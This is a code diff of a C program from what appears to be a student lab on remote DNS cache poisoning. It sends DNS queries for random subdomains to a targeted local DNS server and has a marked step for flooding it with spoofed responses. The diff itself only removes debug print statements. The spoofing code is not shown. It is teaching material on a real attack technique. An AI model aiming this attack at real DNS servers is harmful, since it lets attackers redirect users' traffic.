@@ -42,12 +42,7 @@ int main()
   unsigned char ip_req[MAX_FILE_SIZE];
   int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);
   printf("bytes read in req: %d\n", n_req);
-  // printf("req: ");
-  // for (int i = 0; i < n_req; i++)
-  // {
-  //   printf("%02X ", ip_req[i]);
-  // }
-  // printf("\n");
+
   // Load the first DNS response packet from file
   FILE *f_resp = fopen("ip_resp.bin", "rb");
   if (!f_resp)
@@ -58,7 +53,7 @@ int main()
   unsigned char ip_resp[MAX_FILE_SIZE];
   int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);
   printf("bytes read in resp: %d\n", n_resp);
-  // printf("resp: %b\n", ip_resp);
+  
   char a[26] = "abcdefghijklmnopqrstuvwxyz";
   unsigned short id = 0;
   while (1)
@@ -68,7 +63,7 @@ int main()
     name[5] = '\0';
     for (int k = 0; k < 5; k++)
       name[k] = a[rand() % 26];
-    // printf("name: %s\n", name);
+      
     // ##################################################################
     /* Step 1. Send a DNS request to the targeted local DNS server.
                This will trigger the DNS server to send out DNS queries */
@@ -76,7 +71,7 @@ int main()
     // ... Students should add code here.
     memcpy(ip_req + 41, name, 5);
     send_dns_request(ip_req, n_req);
-    // printf("after step 1 \n");
+    
     /* Step 2. Send many spoofed responses to the targeted local DNS server,
                each one with a different transaction ID. */
 
